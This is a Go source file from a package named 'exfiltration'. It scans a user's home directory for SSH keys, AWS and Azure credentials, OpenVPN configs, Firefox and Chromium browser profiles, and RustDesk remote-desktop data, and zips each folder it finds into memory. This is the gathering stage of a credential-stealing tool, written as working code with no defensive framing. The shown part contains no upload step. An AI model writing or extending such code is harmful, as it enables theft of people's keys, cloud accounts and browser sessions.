package exfiltration

import (
	"os"
	"path/filepath"
)



func checkDirExists(dir string) bool {
	_, err := os.Stat(dir)
	if err == nil {
		return true
	}else {
		return false
	}
}

func GetDirs(home string) (map[string][]byte) {
	directories := []string {
		".ssh", ".aws", ".azure", ".openvpn", ".mozilla/firefox", ".config/chromium", ".config/rustdesk", ".local/share/rustdesk",
	}
	var xd = make(map[string][]byte)
	for _, value := range directories {
	    AcDir := filepath.Join(home, value)
	    if checkDirExists(AcDir) {
		   d, _ := ZipInMemory(AcDir)
		   xd[value[1:]+".zip"] = d
	    }
    }
	return xd
}